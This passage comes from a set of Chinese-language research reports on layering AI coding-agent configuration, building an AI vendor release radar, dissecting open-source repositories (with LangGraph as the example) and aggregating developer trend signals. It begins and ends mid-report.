L3. 团队级\\n\\n适合：\\n- version-controlled repo rules / `CLAUDE.md` / `AGENTS.md`\\n- shared project skills / slash commands / workflows\\n- project-scoped MCP configs\\n- skill naming、ownership、review 机制\\n- minimal eval / telemetry\\n\\n原因：\\n- 团队的痛点从“不会用”变成“每个人用得不一样”。此阶段重点是 shared artifacts 和 consistency，而不是单人效率极值。[S1][S6][S8][S11][S12][S13]\\n\\n#### L4. 平台 / 企业级\\n\\n适合：\\n- admin/system managed policy\\n- approved distribution channels (plugin/marketplace/internal registry)\\n- tool dependency declaration\\n- approval/security rules\\n- memory governance\\n- evaluation / observability / lifecycle management\\n\\n原因：\\n- 企业最担心的是不可见的 prompt 漂移、工具越权、distribution 失控、审计缺失，而不是少一个快捷命令。[S1][S2][S3][S6][S17][S18]\\n\\n### 3. 按成熟度阶段分层：不同阶段的打法不同\\n\\n#### 阶段 A：Bootstrap\\n\\n最小可用栈：\\n1. 一个 repo-root 常驻指令文件\\n2. 一套 path/file scoped rules\\n3. 2-3 个显式 workflows/commands\\n4. 必要的 MCP servers\\n5. ignore / sandbox / approval baseline\\n\\n目标：\\n- 先让 agent “别犯低级错”\\n- 先把团队重复说的话固化\\n\\n#### 阶段 B：Growth\\n\\n新增：\\n- domain skills library\\n- tool dependencies / references / templates\\n- memories 作为 recall 补层\\n- explicit subagents for research/review\\n\\n\\n====\\nFILE: reports/round1-dimension5-ai-vendor-release-radar-applicable-scenarios-and-layering.md\\n# Round 1 / 维度5：AI 厂商发布雷达的适用场景与分层\\n\\n- 完成时间：2026-04-18 05:00（Asia/Shanghai）\\n- 研究对象：OpenAI / Anthropic / Google / xAI / Mistral 的 release channel、抓取方法、diff detection、impact scoring\\n- 研究目标：明确这类 `daily radar runner` 在不同场景、不同用户层级、不同组织阶段下应该如何调整 source、diff、评分和输出物\\n- 研究方法：优先使用五家厂商的官方 changelog、deprecations / lifecycle、model release notes、migration docs、pricing / models 页面；统一于 2026-04-18 检索\\n\\n## TL;DR\\n\\n- `AI 厂商发布雷达` 不该被设计成一个统一的“新闻摘要器”，而应被设计成一个分层决策系统：从 `D0 感知层` 到 `D3 治理层`，深度由 `谁需要行动、行动有多紧急、需要多强证据` 决定，而不是由“监控了几家 vendor”决定。[S1][S2][S6][S7][S8][S9][S10][S11][S12][S13][S14]\\n- 最稳定的 5 类适用场景是：`S1 市场/产品感知`、`S2 集成维护与迁移`、`S3 平台路由与成本运营`、`S4 能力侦察与架构规划`、`S5 风险/治理/企业基线`。它们会用到相似的官方 source，但 source priority、更新 SLA、impact scoring 权重和输出物完全不同。[S1][S2][S6][S7][S8][S9][S10][S11][S12][S13][S14]\\n- 用户层级上，`单 vendor builder` 通常只需要 `D0-D1`；`多 vendor 产品/平台团队` 至少需要 `D2`；`安全 / 采购 / 合规 / 治理` 要求 `D3`，因为它们必须保留 raw snapshot、replacement 证据和审计链路。[S1][S7][S9][S10][S12][S13][S14]\\n- 组织阶段上，最合理的升级路径是 `探索期 -> 构建期 -> 规模化期 -> 治理期`。不是所有团队都应该一开始就做全量 multi-vendor pager；很多团队先做 `migration watch` 就足够，只有当你真的进入多 vendor 生产环境后，`control-plane radar` 才有明显 ROI。[S1][S7][S8][S9][S10][S12][S13]\\n- 这类雷达的边界也很明确：它适合 `release intelligence`，不适合 `uptime / outage monitoring`、`benchmark / eval 追踪` 或 `泛 AI 新闻聚合`。后面三类要么需要 status 系统，要么需要独立评测 runner，要么只是品牌情报而不是工程雷达。[S11][S14]\\n\\n## 事实\\n\\n### 1. 五家厂商的官方发布面本身就在按受众和行动类型分层\\n\\n- [事实] OpenAI 至少把发布信息拆成 `API changelog`、`API deprecations`、`Model Release Notes`、`ChatGPT Release Notes` 四个主面；在 `2025-08-27` 的 ChatGPT Release Notes 中，还明确写出 “Codex 之后的产品信息会迁移到 `developers.openai.com/codex`”。这说明同一家 vendor 内部已经把 `API`、`ChatGPT`、`product surface` 分成不同真相源。[S1][S2][S3][S4]\\n- [事实] Anthropic 的 Platform Release Notes 明确把 `Claude Platform`、`Claude Apps` 和 `Claude Code` 分开维护，并把 `Model deprecations` 单独建表。这不是内容组织偏好，而是 release control plane 的天然分层。[S6][S7]\\n- [事实] Google 也不是单一发布面：`Gemini API changelog` 负责 API/model 时间线，`Model versions and lifecycle` 负责 stable alias / retirement，`Vertex AI release notes` 负责企业和平台面的 capability、计费、region、runtime 变化。[S8][S9][S10]\\n- [事实] xAI 把 `Release Notes`、`Models and Pricing`、`Migrating to New Models` 分成三个不同页面；Mistral 进一步把 changelog 做成可按 `date` 和 `type of release` 过滤的 typed stream。这意味着厂商自己已经假设“不是所有读者都在看同一类变化”。[S11][S12][S13][S14]\\n\\n### 2. 官方 source 暴露出的变化，至少对应四种完全不同的行动\\n\\n- [事实] `lifecycle / deprecation` 类变化直接决定迁移动作。OpenAI deprecations 明确区分 `deprecated`、`legacy` 与 `shutdown date`；Anthropic 提供当前状态表并承诺对公开模型至少提前 60 天通知；Google lifecycle 页为 stable model 给出 release date、retirement date 和 recommended upgrade；xAI migration 页明确告诉开发者看 console 上的 `deprecated` tag 并切换到新模型。[S1][S7][S9][S13]\\n- [事实] `alias / version consistency` 类变化直接影响行为稳定性。OpenAI changelog 在 `2026-02-10` 更新 `gpt-5.2-chat-latest` 指向最新 ChatGPT 模型，在 `2026-03-03` 发布 `gpt-5.3-chat-latest`；Google 在 `2025-06-05` 写明 `gemini-2.5-pro-preview-05-06` 将于 `2025-06-26` redirect 到 `gemini-2.5-pro`；xAI 明确区分 `<modelname>`、`<modelname>-latest`、`<modelname>-<date>` 三层 alias 语义。[S2][S8][S12]\\n- [事实] `capability / runtime / tool` 类变化服务于架构与 adoption 决策。OpenAI 在 `2026-03-05` 为 GPT-5.4 带来 `tool search`、`computer use`、`1M context`；Anthropic 在 `2026-04-09` 推出 advisor tool beta，并在 `2026-04-08` 发布 Managed Agents public beta；Google Vertex 在 `2025-09-10` 为 Agent Engine 增加 Code Execution、A2A、bidirectional streaming；xAI 在 `2025-10-15` 让 tools GA，并在 `2026-03-12` 推出 Provisioned Throughput；Mistral 在 `2025-05-27` 推出 Agents API，并在 `2026-03-12` 为 Agents / Conversations 增加 Guardrails。[S2][S6][S10][S11][S14]\\n- [事实] `cost / security / governance` 类变化不会体现在“新模型上线”里，但对 operator 影响更大。Google Vertex 在 `2025-12-16` 公告 `Sessions`、`Memory Bank`、`Code Execution` 将于 `2026-01-28` 开始计费；xAI models 页写明 Voice Agent 使用 tools 会叠加 tool invocation cost；Mistral 在 `2025-08-27` 的 `SECURITY API UPDATED` 条目中明确警告 `p` 参数变更可能 break strict parser；xAI release notes 还单列了 `Audit Logs`。[S10][S11][S12][S14]\\n\\n### 3. 官方文档已经暴露出适合做“按层处理”的 freshness 与 confidence 信号\\n\\n- [事实] OpenAI deprecations 首页直接说明，受影响客户会通过 email、documentation 和重大变更的 blog post 收到通知；这给了 `source_priority` 和 `confidence` 很清晰的排序依据。[S1]\\n- [事实] Anthropic model deprecations 不只给出 `deprecated` 历史，还给出 `Current State`、`Tentative Retirement Date`，并写明至少 60 天通知。这使它非常适合进入 `migration watch` 与 `governance baseline` 层。[S7]\\n- [事实] Google Gemini API changelog 页底部明确写出 `Last updated 2026-04-15 UTC`，而 lifecycle 页把 alias / stable / retirement 做成结构表。这说明 Google 的 source 既有 freshness 信号，也有结构化字段。[S8][S9]\\n- [事实] xAI models 页明确说“最新可用性以 console 的 Models Page 为准”，migration 页明确说 deprecating model 会打 `deprecated` tag；Mistral changelog 明确支持按 release type 过滤。这些都不是面向新闻读者的写法，而是面向 operator 的操作信号。[S12][S13][S14]\\n\\n### 4. 自动化定期 brief 本身是成立的场景，但它只是最浅层的应用方式\\n\\n- [事实] OpenAI 在 `2026-02-02` 的 Codex app 文章中写明，内部已经用 Automations 去做 `daily issue triage`、`finding and summarizing CI failures`、`generating daily release briefs`。这说明“自动化每日发布简报”是一个真实存在的 workflow，但它更接近 `scheduled briefing`，并不自动等于 `multi-vendor engineering action engine`。[S5]\\n\\n## 推断\\n\\n### I1. 对 `AI 厂商发布雷达` 来说，最有用的第一分层轴不是 vendor，而是 `actionability`\\n\\n置信度：高\\n\\n原因：\\n\\n- 同样一条发布信息，对 `产品经理` 来说可能只是本周 briefing 的一条 bullet；对 `SDK owner` 来说可能是今天必须创建迁移 ticket 的事件；对 `安全/采购` 来说则可能意味着 approved baseline 需要改版。\\n- 官方 source 的拆分方式已经在暗示这一点：deprecations、lifecycle、pricing、migration guides、release notes 分别服务于不同动作，而不是服务于同一个“读新闻”的用户。[S1][S6][S7][S8][S9][S10][S11][S12][S13][S14]\\n\\n### I2. 最稳的深度分层不是“轻版/重版”，而是 `D0 -> D3` 四层渐进\\n\\n置信度：高\\n\\n| 深度层 | 核心目标 | 最小数据面 | 典型用户 | 典型输出 |\\n| --- | --- | --- | --- | --- |\\n| `D0 感知层` | 今天有什么值得知道的变化 | changelog / release notes / model release notes | PM、Founder、研究员、内容团队 | daily brief、weekly digest |\\n| `D1 迁移层` | 哪些变化会让现有集成失效或漂移 | D0 + deprecations + lifecycle + migration guides + alias mapping | 应用团队、SDK owner、集成方 | migration ticket、owner list、deadline board |\\n| `D2 控制面层` | 哪些变化会改变平台路由、成本、能力边界 | D1 + models/pricing + tool/runtime/region/quota/security 变更 | AI 平台、Infra、架构组 | routing change、cost memo、capability backlog |\\n| `D3 治理层` | 哪些变化会影响企业基线、审计与风险接受 | D2 + raw snapshots + evidence hash + approved inventory + escalation state | 安全、采购、合规、治理 | risk register、baseline diff、approval trail |\\n\\n- `D0` 不需要 owner routing，也不需要 raw snapshot archive。\\n- `D1` 必须引入 `effective_at / shutdown_at / replacement / alias_target`，否则迁移场景不成立。\\n- `D2` 才值得做跨 vendor normalized schema 和 impact scoring。\\n- `D3` 必须补齐 evidence-preserving storage、owner、状态流转和审计说明。\\n\\n### I3. 适用场景至少应该拆成 5 类，因为它们的 source priority、SLA 和输出物完全不同\\n\\n置信度：高\\n\\n## 适用场景矩阵\\n\\n| 场景 | 典型用户 | 主要关心事件 | 必抓 source | 建议更新 SLA | 典型输出 |\\n| --- | --- | --- | --- | --- | --- |\\n| `S1 市场/产品感知` | PM、Founder、技术研究、竞争情报 | 新模型、preview/GA、大版本能力发布 | changelog、product/help release notes、重点 blog | 每日 digest / 每周综述 | 1 页简报、趋势摘要 |\\n| `S2 集成维护与迁移` | 应用团队、SDK owner、运营中集成方 | deprecation notice、shutdown、alias remap、preview redirect、breaking API update | deprecations、lifecycle、migration guides、model catalog | 同日或 T+1 | migration ticket、deadline 看板 |\\n| `S3 平台路由与成本运营` | AI 平台、Infra、FinOps | pricing、quota、rate limit、tool cost、region、throughput、runtime 计费 | models/pricing、Vertex release notes、typed changelog | 每日 | routing 规则更新、成本评估 |\\n| `S4 能力侦察与架构规划` | Staff / Architect / 平台建设者 | managed agents、memory、code execution、computer use、tools、MCP、search | API changelog、platform notes、feature docs | 每日或每周 backlog 刷新 | POC backlog、adoption 候选项 |\\n| `S5 风险/治理/企业基线` | Security、Compliance、采购、治理 | security fix、audit logs、enterprise controls、approved model retirement、policy surface 变化 | deprecations、security-typed changelog、enterprise/platform notes、audit features | 每日高置信提醒 + 每周审阅 | risk register、baseline diff、审批记录 |\\n\\n补充判断：\\n\\n- `S1` 追求的是 `coverage` 和 `可读性`，不是 `零漏报`。\\n- `S2` 追求的是 `deadline correctness`，因此最重视 `shutdown_at`、`replacement`、`alias_target`。\\n- `S3` 追求的是 `operator cost / routing efficiency`，因此价格、配额、tools 和 runtime 变化比“又发了一个模型名”更重要。\\n- `S4` 追求的是 `architecture option discovery`，因此能力类变化需要单独成类，不能被 launch digest 淹掉。\\n- `S5` 追求的是 `auditability`，所以摘要本身不够，必须保留 evidence。\\n\\n### I4. 用户层级的正确划分，不是“懂不懂 AI”，而是“你是否要为变化负责”\\n\\n置信度：高\\n\\n| 用户层级 | 典型职责 | 推荐深度 | 默认该看什么 | 默认不必做什么 |\\n| --- | --- | --- | --- | --- |\\n| `L1 单 vendor builder` | 自己维护一两个 API 集成 | `D0-D1` | 自家 vendor 的 deprecations、alias、价格、关键 tool 变化 | 不必做跨 vendor 标准化和复杂评分 |\\n| `L2 产品 squad` | 为某个产品线负责模型接入与稳定性 | `D1-D2` | surface-aware diff、迁移日期、replacement、定价与能力边界 | 不必 ingest 每条品牌 blog 或 UI 小更新 |\\n| `L3 AI 平台团队` | 维护多 vendor 路由、SDK、默认模型策略 | `D2` | normalized events、impact scoring、owner routing、cost / capability delta | 不应把所有低信号事件推给一线工程师 |\\n| `L4 安全 / 治理 / 采购` | 维护 approved inventory、风险接受与合规 | `D2-D3` | lifecycle、security、enterprise control、audit log、evidence retention | 不能只依赖二次摘要，不保留 snapshot |\\n\\n- `L1` 最怕过度建设，花很多时间做了一个自己用不上的多层雷达。\\n- `L2` 最怕只看 headline，不看 `shutdown date / replacement`。\\n- `L3` 最怕没有统一 schema，导致每家厂商都要单独人工解释。\\n- `L4` 最怕没有证据链，只剩一句“昨天好像看见某页改了”。\\n\\n### I5. 组织阶段决定你应该从哪一层开始，而不是一上来就追求全栈完备\\n\\n置信度：中高\\n\\n| 阶段 | 组织特征 | 最合适起点 | 升级触发条件 | 不该急着做的事 |\\n| --- | --- | --- | --- | --- |\\n| `P1 探索期` | 还在选 vendor 或只做实验 | `S1 + D0` | 开始有真实集成或计费暴露 | 不必做 owner routing、raw archive |\\n| `P2 构建期` | 已有 1-2 个 vendor 进入产品 | `S2 + D1` | 出现 deprecation、alias 漂移、预算压力 | 不必把所有 capability 新闻都转成工单 |\\n| `P3 规模化期` | 多产品线、多 vendor、共享平台 | `S2 + S3 + S4 + D2` | 有统一平台团队与跨项目默认策略 | 不应继续靠人工读页面合并 |\\n| `P4 治理期` | 进入 enterprise、采购、合规和审计流程 | `S5 + D3` | 需要 baseline、证据、审批和复盘 | 不能只保留摘要，不留证据 |\\n\\n这组阶段划分的关键点是：\\n\\n- `P1` 的目标是“不要错过大方向”。\\n- `P2` 的目标是“不要被 retirement / alias / breaking change 打到”。\\n- `P3` 的目标是“把 vendor 变化纳入统一平台策略”。\\n- `P4` 的目标是“让变化可被审计、批准和追责”。\\n\\n## 设计建议\\n\\n- [建议 | 前提：你要先做一个能跑起来的版本] 默认从 `D1 迁移层` 起步，而不是 `D3 治理层`。因为五家厂商都已经清楚暴露 `deprecation / lifecycle / replacement`，这是最直接、ROI 最高的第一条线。[S1][S7][S9][S13]\\n- [建议 | 前提：你要服务多个角色] 不要给所有人同一份 daily digest。至少拆成三路：\\n  - `awareness digest`\\n  - `engineering action queue`\\n  - `governance / risk register`\\n- [建议 | 前提：你要做 impact scoring] 不要只保留一个总分。建议最少拆成三套权重：\\n  - `migration_score`\\n  - `platform_score`\\n  - `governance_score`\\n  同一事件在不同场景下可能得到完全不同的优先级。\\n- [建议 | 前提：你要逐步升级系统] 让 schema 随层级升级，而不是一开始就把所有字段塞满：\\n  - `D0`：`vendor / surface / title / summary / url / published_at`\\n  - `D1`：加 `entity_type / entity_id / event_type / effective_at / shutdown_at / replacement / alias_target`\\n\\n====\\nFILE: reports/round1-dimension5-applicable-scenarios-and-layering.md\\n# Round 1 - 维度5：适用场景与分层\\n\\n- 完成日期：2026-04-18\\n- 研究窗口：2025-2026（少量 2024 基础研究仅用于补充架构视图与 stakeholder view 背景）\\n- 任务目标：明确“开源项目解剖 SOP”在不同场景、不同用户层级、不同执行阶段下应如何调整深度、证据面与产物\\n- 研究方法：优先使用 GitHub / LangChain 官方文档与近年软件工程论文；统一于 2026-04-18 检索\\n\\n## TL;DR\\n\\n- `开源项目解剖 SOP` 不适合被理解成“一套固定深度、对所有人通用的全量流程”，而更适合被理解成一个 `depth-adjusted repository intelligence workflow`：深度取决于 `目标函数 x 用户层级 x 证据要求`。[S1][S2][S3][S4][S5][S6][S7][S8][S9]\\n- 2025-2026 最稳定的 5 类适用场景是：`项目发现/选题`、`新手上手/首次贡献`、`采用/集成评估`、`架构/决策学习`、`安全/治理审计`。它们都在“看 repo”，但要回答的问题、该看哪些 artifact、以及何时停止，完全不同。[S1][S2][S3][S4][S7][S8][S9]\\n- 不同用户层级的默认打法也不同：`学习者` 主要需要 entry points 和 build/test path，`构建者` 需要 runtime / dependency / upgrade risk，`架构师/研究者` 需要 decision map 与 pattern inventory，`安全/平台方` 还要看 release/CI/CD/community artifact。[S1][S3][S4][S5][S6][S7][S8][S9]\\n- 对 LangGraph 样本而言，当前研究最适合定位在 `L2-L3`：先做 `采用/集成评估` 与 `架构/决策学习`，而不是把精力先花在“首贡导航”或“全生态安全尽调”上。原因是官方自己把它定义为 `low-level orchestration framework and runtime`，v1 也明确是 stability-focused release，适合先看 core runtime 与边界，而不是先看外围包装层。[S10][S11][S12][S13]\\n\\n## 事实\\n\\n### 1. 官方 codebase exploration 已经默认区分了“快速理解”和“深度研究”两类场景\\n\\n- GitHub 的 `Using GitHub Copilot to explore a codebase` 明确把常见问题列成不同层级：`architecture overview`、`design patterns`、`how do I build this project`、`entry points`、`data flow`、`security mechanisms`。这说明 codebase 理解并不是单一问题，而是由架构、构建、运行路径和安全等不同问题簇组成。[S1]\\n- GitHub 的 `Researching with GitHub Copilot CLI` 进一步把 `/research` 定位成“需要大量调查”的深度报告入口：它会读项目树、关键文件，生成 architecture diagrams、component breakdowns、data flow descriptions；同时官方也明确说，`quick, simple questions` 不适合走这条重型路径。[S2]\\n- 同一文档还说明 research agent 可以 `works across repositories`，并会对 `comparing technologies or approaches` 这种问题采用对比型输出。这直接说明“跨 repo 的架构对照/案例对照”本身已经是独立场景，而不是单仓库理解的附属动作。[S2]\\n\\n### 2. 新手上手场景与架构研究场景不是一回事，前者更像“降低进入门槛”\\n\\n- GitHub 工程师关于学习新 codebase 的实践文章，把 `Good First Issues`、Copilot 辅助理解、telemetry/metrics、通过测试和有意破坏来理解边界，作为 onboarding 的有效方法。这类方法强调的是“找到自然入口并快速建立局部心智模型”，而不是先做全局 architecture reconstruction。[S4]\\n- 2025 年关于 OSS newcomer onboarding 的研究指出，新人高度期待 AI mentor 提供 `recommending projects based on personalized requirements` 和 `assessing and categorizing project issues by difficulty` 等能力；研究也明确指出，`discovering an interested project` 这类环节仍是当前支持不足的区域。[S3]\\n- 这说明“开源项目解剖”里至少存在一个前置层：在真正深入仓库之前，先回答 `值不值得投入时间`、`从哪里进入`、`第一步改哪里`。这和后续的决策挖掘、pattern theft 是不同任务。[S3][S4]\\n\\n### 3. 架构理解本身是多视图、多 stakeholder 的问题，不能假设 repo 已经为你准备好了合适文档\\n\\n- 关于开源项目 architecture views 的大规模研究指出，不同 stakeholder 对系统有不同关注点，architectural views 的价值就在于把多维系统拆成针对具体关切的表示；研究还挖出 12.2k 个 GitHub 项目中的 15k 个视图文件，但发现大多数项目只有单一视图、而且往往较少更新、偏非正式表达。[S5]\\n- 2026 年的 CIAO 论文直接把问题陈述为：系统理解需要 architecture documentation，但它往往 `unavailable or incomplete`；因此他们提出从 GitHub repository 自动生成 system-level architecture documentation 的结构化流程，并沿用 `ISO/IEC/IEEE 42010`、`Views & Beyond`、`C4 model` 的模板。[S6]\\n- 同一论文也指出，自动生成的结果虽然被开发者认为总体可用，但 `diagram quality`、`high-level context modeling` 和 `deployment views` 仍然是薄弱项。这说明“架构研究”场景不能只指望 repo 自带视图，也不能把自动生成文档直接当成终局真相。[S6]\\n\\n### 4. 一旦目标变成采用、集成、修改或 fork，build/test/runtime 证据就比 README 更重要\\n\\n- `Repository Intelligence Graph` 论文提出了一个来自 `build and test artifacts` 的、`deterministic` 且 `evidence-backed` 的 architectural map，节点覆盖 buildable components、runners、tests、external packages、package managers；实验显示，对 agent 提供这类结构图可以显著提升准确率，且多语言仓库收益更大。[S7]\\n- GitHub dependency graph 文档说明，该视图来自对 `manifests and lock files` 的分析；它不仅能在 PR 上做 dependency reviews，还能暴露 `dependents` / `Used by` 数据。这些信息明显更适合 `adopt / integrate / maintain` 场景，而不是只做入门浏览。[S8]\\n- 换言之，`采用/集成评估` 关心的核心不是“这个项目讲得清不清楚”，而是 `它怎么 build/run、依赖面多大、被谁依赖、升级时什么地方会出风险`。这与新手上手时关心的“从哪儿看起”是两种问题。[S1][S7][S8]\\n\\n### 5. 安全/治理场景要求把研究对象从“代码”扩展到“开发过程”\\n\\n- 关于 XZ Utils 供应链攻击的 2025 论文明确指出，攻击者利用的不只是代码本身，还包括 `community management`、`CI/CD configurations` 和长期建立合法性的过程；作者是通过 GitHub events 和 development artifacts 去重建攻击时间线的。[S9]\\n- 这说明一旦研究目标变成 `security / governance / assurance`，只做源码和文档层的解剖明显不够，必须把 `release process`、`maintainer structure`、`CI/CD`、`历史演化异常` 纳入 artifact 范围。[S8][S9]\\n\\n### 6. LangGraph 作为样本，更适合“采用/架构学习”层，而不是一开始就做外围生态全景\\n\\n- LangGraph 官方 overview 把它定义为 `low-level orchestration framework and runtime for building, managing, and deploying long-running, stateful agents`，并明确区分：如果你需要更高层的 agent abstraction，应优先看 LangChain agents；LangGraph 自己聚焦 durable execution、streaming、human-in-the-loop、memory 等 orchestration 能力。[S10]\\n- Graph API 文档进一步说明其核心对象是 `State / Nodes / Edges`，执行模型基于 message passing 与 `super-steps`，节点并行与顺序执行的语义在 runtime 中被显式定义。[S11]\\n- v1 release notes 明确说明：这是 `stability-focused release`，保持 `core graph APIs and execution model unchanged`，同时与 LangChain `create_agent` 分工协作。[S12]\\n- GitHub 仓库页面在 2026-04-18 显示约 `29.5k stars`、`5.1k forks`、`501` 个 releases，最新版本 `1.1.7` 发布于 `2026-04-17`。这说明它既热门、也高度活跃，因此很适合作为“每周热门 repo 解剖”的主样本，但更适合先看稳定核心，而不是先扩散到整个生态。[S13]\\n\\n## 推断\\n\\n### I1. 维度5 最有效的分层轴不是“仓库大小”或“项目类型”，而是 `目标函数 x 用户层级 x 证据深度`\\n\\n置信度：高\\n\\n原因：\\n\\n- 同样是“理解一个 repo”，有人是在选题，有人是在做首贡，有人是在评估是否采用，有人是在提炼 design pattern，有人是在做供应链风险审计。\\n- 这些任务共享一个对象，但并不共享同一终点，也不共享同一份 artifact contract。[S1][S2][S3][S4][S5][S6][S7][S8][S9]\\n\\n### I2. 不是所有场景都应该默认走完整 `7 阶段 SOP`\\n\\n置信度：高\\n\\n更合理的做法是按深度分成 4 层：\\n\\n| 深度层 | 适用问题 | 最小证据集 | 典型产物 |\\n| --- | --- | --- | --- |\\n| `D0 Surface Scan` | 这个 repo 值不值得继续看？ | README、docs、repo metadata、releases、Used by | 选题结论、入口清单 |\\n| `D1 Structure Map` | 这个 repo 怎么 build、入口在哪、核心模块是什么？ | 目录树、entry points、build/test、基础 docs | 结构图、上手说明、首贡路径 |\\n| `D2 Runtime + Adoption` | 我能不能基于它做产品或改它？ | D1 + runtime docs + dependency graph + release cadence | 采用评估、集成路径、升级风险 |\\n| `D3 Decision + Assurance` | 它为什么这么设计、哪些 pattern 可偷、它是否可信？ | D2 + issues/PRs/commits/releases/CI-CD/community | decision map、pattern inventory、constraint/risk log |\\n\\n- `新手上手` 往往做到 `D1` 已经足够。\\n- `采用/集成` 通常至少要到 `D2`。\\n- `架构/决策学习` 与 `安全/治理审计` 才值得稳定走到 `D3`。[S1][S2][S4][S7][S8][S9]\\n\\n### I3. 适用场景至少应分成 5 类，每类都有不同的停止条件\\n\\n置信度：高\\n\\n## 适用场景与分层矩阵\\n\\n| 场景 | 典型用户 | 核心问题 | 必看证据 | 默认停止点 | 建议产物 |\\n| --- | --- | --- | --- | --- | --- |\\n| `S1 项目发现/选题` | 研究者、新贡献者、技术内容作者 | 值不值得投入 2-4 小时继续拆？ | stars/forks/releases、docs、repo 活跃度、Used by、问题标签 | 能判断 `继续/放弃/延后` | shortlist、选题理由、首批入口 |\\n| `S2 新手上手/首次贡献` | newcomer、转岗工程师 | 怎么跑起来、从哪里改、第一类 issue 是什么？ | architecture overview、build/test path、entry points、good first issues、局部 telemetry/test signal | 能完成首次运行或首个小改动 | onboarding note、entry-point map、first-task path |\\n| `S3 采用/集成评估` | builder、tech lead、团队 owner | 能否基于它构建产品、接入成本和升级风险多大？ | runtime model、dependency graph、release cadence、extension seams、compatibility boundary | 能回答 `adopt / defer / fork / wrap` | adoption memo、integration plan、risk list |\\n| `S4 架构/决策学习` | staff engineer、架构师、研究者 | 它的核心抽象是什么、为什么这么设计、哪些 pattern 可偷？ | source + docs + runtime + issues/PRs/commits/releases | 能稳定输出 `architecture map / decision map / pattern inventory / constraint log` | 结构化深读报告 |\\n| `S5 安全/治理审计` | 安全、平台、供应链、尽调方 | 这个项目是否可信、可持续、可治理？ | dependency graph、release process、CI/CD、maintainer/community history、异常事件 | 能形成风险等级与治理建议 | assurance memo、risk register、治理清单 |\\n\\n### I4. 用户层级应该至少拆成 4 档，而不是只分“懂代码/不懂代码”\\n\\n置信度：高\\n\\n| 用户层级 | 最常见目标 | 不应默认做的事 | 最优打法 |\\n| --- | --- | --- | --- |\\n| `L1 学习者 / newcomer` | 快速建立局部心智模型 | 一开始就追完整历史与全生态 | 从 docs -> build/test -> entry points -> good first issue |\\n| `L2 构建者 / integrator` | 判断能否接入、扩展、二次开发 | 只靠 README 或 sample app 下结论 | 强制补 runtime、dependency、release boundary |\\n| `L3 架构师 / 研究者` | 重建设计意图并提炼 pattern | 只做现状总结、不挖 rationale | 按 `source + runtime + history` 完成完整解剖 |\\n| `L4 安全 / 平台 / 治理方` | 评估可信度、可维护性、供应链风险 | 把“文档齐全”当成“治理可靠” | 加查 CI/CD、releases、maintainer 变迁、process artifact |\\n\\n- `L1` 最怕过度研究，浪费时间却没有第一步动作。\\n- `L2` 最怕低估 runtime / upgrade risk。\\n- `L3` 最怕只有“是什么”，没有“为什么”。\\n- `L4` 最怕只审代码，不审流程。[S1][S3][S4][S7][S8][S9]\\n\\n### I5. 阶段分层比“读了多少文件”更重要，因为每个阶段的退出条件不同\\n\\n置信度：中高\\n\\n建议把一次 repo 解剖拆成以下阶段：\\n\\n1. `Stage 0 / Select`\\n   目标：判断是否继续。\\n   退出条件：能回答“为什么值得继续看”和“暂不看的边界”。\\n\\n2. `Stage 1 / Map`\\n   目标：建立结构与入口。\\n   退出条件：说清 build/test path、entry points、主要模块。\\n\\n3. `Stage 2 / Model`\\n   目标：还原 runtime 与 dependency shape。\\n   退出条件：说清状态流、控制流、依赖面、扩展点。\\n\\n4. `Stage 3 / Explain Why`\\n   目标：恢复 decision rationale 与 constraints。\\n   退出条件：能给出 decision map、关键折中、不可迁移边界。\\n\\n5. `Stage 4 / Assure or Monitor`\\n   目标：把发现用于 adopt / govern / compare / monitor。\\n   退出条件：形成决策、治理建议或持续监控面。\\n\\n- `S1/S2` 多数停在 `Stage 0-1`。\\n- `S3` 通常要到 `Stage 2`。\\n- `S4/S5` 才稳定需要 `Stage 3-4`。\\n\\n\\n====\\nFILE: reports/round1-dimension5-dev-trends-radar-scenarios-and-layering.md\\n# Round 1 / 维度5：开发者趋势雷达的适用场景与分层\\n\\n- 完成时间：2026-04-18 04:59（Asia/Shanghai）\\n- 研究任务：调研 `GitHub Trending / Hacker News / Product Hunt / Reddit / X tech list` 多源聚合、去重、打分、个人兴趣过滤主题在 2025-2026 的不同场景、用户层级与决策阶段下的差异化打法\\n- 检索范围：优先使用 2025-2026 仍可访问的官方平台页面、官方帮助中心、官方 API / 推荐系统文档；统一于 2026-04-18 检索\\n- 输出规则：事实、推断、建议分开写；推断标注置信度\\n\\n## TL;DR\\n\\n- `开发者趋势雷达` 最合适的理解，不是一个对所有人都一样的“总热榜”，而是一个 `public signal routing system`。它是否好用，取决于用户到底是在做 `弱信号发现`、`工具/工作流筛选`、`发布/竞品跟踪`、`社区反馈验证`，还是 `团队周报/组合监控`。[S1][S2][S6][S8][S10][S12][S15][S16][S18][S19]\\n- 五个源天然分工不同：GitHub 更像 `code momentum + personal watchlist`，HN 更像 `discussion validation + skepticism filter`，Product Hunt 更像 `launch visibility + maker narrative`，Reddit 更像 `community problem language + multi-community synthesis`，X 更像 `expert graph weak signal + editable personalization`。[S1][S2][S3][S4][S5][S6][S8][S10][S12][S13][S15][S16][S17][S18][S19][S20]\\n- 维度5 最稳的分层轴不是按“平台”或“赛道”硬切，而是按 `场景目标 x 用户层级 x 决策阶段` 切。一个人可能在上午要看 `Now Feed` 抓新东西，下午要看 `Watchlist` 跟 3 个主题，周末只想看 `Weekly Digest`。[S2][S8][S12][S13][S16][S17][S18][S19][S20]\\n- 这类雷达最适合处理 `公开、持续、可讨论` 的开发者信号；不适合代替 `私有企业采用率`、`封闭社区情报`、`真实收入/留存` 或 `动手评测后的工具质量结论`。\\n- 结合前序维度已确认的 2026 强信号主轴 `AI coding agents + MCP/Skills + browser/computer use`，分层的必要性更高：个人 builder 关心“这周该试什么”，maintainer / founder 关心“是否进入真实工作流”，策略层关心“是否跨源确认并开始稳定扩散”。如果还只给一个总榜，几乎一定会错配。\\n\\n## 事实\\n\\n### 1. 平台原生 surface 已经把“发现、收藏、验证、过滤”拆成不同工位\\n\\n- [事实] GitHub Trending 的首页语义是 “See what the GitHub community is most excited about today.”，明显是 `today-level` 的发现面；与此同时，GitHub stars 支持 `lists`、搜索、按 `Recently starred / Recently active / Most stars` 排序，以及按语言和仓库类型过滤；GitHub topics 则允许按主题浏览相关仓库、找可贡献项目和寻找某类问题的解决方案。[S1][S2][S3]\\n- [事实] Hacker News FAQ 说明 stories 的基础排序是 `points / time` 的幂次衰减，同时会受 flags、anti-abuse、moderator action 影响；HN 官方 API 又把入口拆成 `topstories / newstories / beststories` 与 `askstories / showstories / jobstories`；FAQ 还提供 `hide` 这种个人视图控制，并会把近期得到足够关注的 repost bury as duplicates。[S4][S5]\\n- [事实] Product Hunt 把 